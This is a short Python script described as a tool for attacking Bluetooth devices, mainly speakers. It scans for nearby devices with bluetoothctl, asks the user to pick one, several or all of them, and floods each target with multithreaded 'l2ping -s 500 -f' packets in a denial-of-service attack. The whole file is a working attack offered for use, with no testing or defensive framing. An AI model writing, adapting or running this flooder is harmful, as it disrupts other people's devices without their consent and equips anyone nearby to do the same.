#!/usr/bin/python3


"""Simple script for using L2PING to attack bluetooth devices, mainly speakers."""


# Import all the modules
import subprocess
import time
from threading import Thread


# Bring all the services up
subprocess.run("hciconfig hci0 up && service bluetooth start && service dbus start",
               shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
print("hci0, dbus and bluetooth are up")


# Defining the functions for scanning, selecting the desired device/devices,
# for attacking the device/devices selected and for running the l2ping
# command that will be passed to the attack functions
def scan():
    global name_list
    global address_list
    subprocess.Popen("bluetoothctl scan on", shell=True,
                     stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    print("Scanning...")
    time.sleep(5)
    name = subprocess.run(
        "bluetoothctl devices | awk '{print $3}'", shell=True, capture_output=True)
    address = subprocess.run(
        "bluetoothctl devices | awk '{print $2}'", shell=True, capture_output=True)
    name_list = ((name.stdout).decode()).split("\n")
    address_list = ((address.stdout).decode()).split("\n")
    name_list.pop()
    address_list.pop()


def selection():
    print("Device Number            Device Address            Device Name")
    print("")
    for device in range(len(name_list)):
        print(
            f"      {device}               {address_list[device]}        {name_list[device]}")
    print("")
    device_selection = input(
        "Select the device you want to attack (separate by comma, or type all to attack all devices): ")
    thread_selection = int(input("Select packet amount (100 recommended): "))
    return device_selection, thread_selection


def attack(threads, device):
    thread_list = []
    for _ in range(threads):
        t = Thread(target=flood, args=(device,))
        thread_list.append(t)
        t.start()
    for t in thread_list:
        t.join()


def flood(device):
    subprocess.run(f"l2ping -s 500 -f {device}", shell=True)


# Select the device and run the attack accordingly
scan()

while 1:
    try:
        device_selection, thread_selection = selection()
        if "," not in device_selection and "all" not in device_selection:
            attack(thread_selection, address_list[int(device_selection)])
        elif "," in device_selection:
            device_list = device_selection.split(",")
            for device_number in device_list:
                attack(thread_selection, address_list[int(device_number)])
        elif "all" in device_selection:
            for device in address_list:
                attack(thread_selection, device)
        else:
            wrong_selection = input(
                "Seems like you typed something wrong. Try again or exit? [again, exit]: ")
            if wrong_selection == "again":
                device_selection, thread_selection = selection()
            else:
                exit()
    except KeyboardInterrupt:
        time.sleep(2)
        interruption = input(
            "Do you wish to continue with attacking, want to rescan or want to stop? [continue, rescan, exit]: ")
        if interruption == "continue":
            continue
        elif interruption == "rescan":
            scan()
            continue
        else:
            exit()
